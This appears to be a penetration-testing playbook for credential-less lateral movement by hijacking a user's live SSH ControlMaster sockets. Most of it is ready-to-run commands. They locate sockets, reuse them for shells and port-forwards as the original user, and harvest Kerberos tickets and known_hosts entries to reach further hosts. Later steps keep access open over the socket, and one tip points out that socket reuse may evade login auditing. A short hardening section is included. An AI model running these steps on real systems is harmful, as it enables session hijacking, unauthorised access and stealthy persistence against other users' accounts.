# Credential-less Lateral Movement — SSH ControlMaster Socket Abuse

## When this applies

- Foothold user has an active SSH multiplexing session (ControlMaster).
- Goal: pivot to wherever the original user has open SSH sessions, with NO credentials at all.
- Particularly useful when the user is a domain user pivoting onto Linux-joined servers via Kerberos+SSSD.

## Technique

When SSH is configured with `ControlMaster` + `ControlPath`, the first connection establishes a multiplexed channel; subsequent `ssh` invocations to the same target reuse the existing TCP/auth channel — no password, no key, no challenge required.

A pentester landing on a shared workstation/jumpbox can pipe new commands through the existing socket. The remote session inherits the ORIGINAL user's authentication context — including `AuthorizedKeysCommand`-issued certificates, smart-card-backed keys, and short-lived OIDC certs that you couldn't replay even if you stole them.

## Steps

### 1. Discovery (run on every Linux foothold)

```bash
# Live multiplex sockets — usual ControlPath patterns
ls -la ~/.ssh/cm-* ~/.ssh/master-* ~/.ssh/ctl-* /tmp/ssh-* 2>/dev/null

# Inspect ssh_config for the ControlPath template + ControlMaster directives
grep -E "ControlMaster|ControlPath|ControlPersist" ~/.ssh/config /etc/ssh/ssh_config 2>/dev/null

# Background-running ssh processes also reveal targets
ps -ef | grep -E "ssh.*-M|ssh.*ControlMaster|ssh.*ControlPath" | grep -v grep
```

Typical hit: `~/.ssh/cm-user@dev-workstation:22` (or percent-expanded `cm-%r@%h:%p`). Filename usually encodes user/host/port.

### 2. Reuse via `-S` flag

Works even without ControlMaster=auto in your local config:

```bash
# One-shot command
ssh -S ~/.ssh/cm-user@dev-workstation:22 dev-workstation hostname

# Interactive shell
ssh -S ~/.ssh/cm-user@dev-workstation:22 dev-workstation

# Port-forward via the existing tunnel (NOT a new connection)
ssh -S ~/.ssh/cm-user@dev-workstation:22 -L 8080:internal:80 dev-workstation -N
```

### 3. Explicit options when `-S` is rejected

Some wrappers reject `-S`:

```bash
ssh -o ControlPath=~/.ssh/cm-user@dev-workstation:22 \
    -o ControlMaster=no \
    dev-workstation
```

### 4. Identify what you've inherited

```bash
ssh -S <socket> target whoami
ssh -S <socket> target id
ssh -S <socket> target klist     # Kerberos tickets
ssh -S <socket> target cat /etc/krb5.conf
```

The target sees you as the original user — full auth context.

### 5. Pivot to other systems via the original user's known_hosts

Once you have the inherited shell, the user's `known_hosts` reveals other hosts they SSH to:

```bash
cat ~/.ssh/known_hosts
```

These are likely candidates for further pivoting (the user has cred/cert auth for them).

### 6. Persistence — leave the session open

If the target user closes their session, the ControlMaster socket may persist with `ControlPersist=N`. Check:

```bash
grep ControlPersist ~/.ssh/config
# If set → the socket lives N seconds after the last connection
```

Open a long-running `tail -f /dev/null` over the socket to keep your access alive.

### 7. Detection / Hardening (defender note for reporting)

Defender mitigation:
```
# /etc/ssh/ssh_config
ControlPath none
```

Or scope `ControlPath` under `/run/user/$UID/` (per-user systemd-managed) instead of `~/.ssh/`. Audit existing sockets with `lsof -U | grep ssh-`.

## Verifying success

- `ssh -S <socket> target whoami` returns the original user without prompting for credentials.
- Interactive shell on target gives you the user's environment, Kerberos tickets, and access.
- `klist` shows valid TGT in the inherited session.

## Common pitfalls

- ControlPath sockets are tied to specific user@host:port — only that exact target reuses the socket.
- If the original SSH session has died, the socket is stale and reuse fails.
- Some SSH versions (older) don't accept `-S` cleanly — fall back to `-o ControlPath=...`.
- Sockets in `/tmp/` may be removed by tmpwatch / systemd-tmpfiles — race against cleanup.
- Audit logs (`auth.log`) may not record the socket-reuse session as a fresh login — useful for stealth, but defenders should monitor `sshd` master-process forks.

## Tools

- Native `ssh` client only.
- No additional tooling required.

## References

- See `system/scenarios/linux-privesc/ssh-controlmaster-hijack.md` for the detailed AD-context variant.
- OpenSSH ControlMaster documentation: https://man.openbsd.org/ssh_config#ControlMaster
- MITRE ATT&CK T1021.004 (Remote Services: SSH).
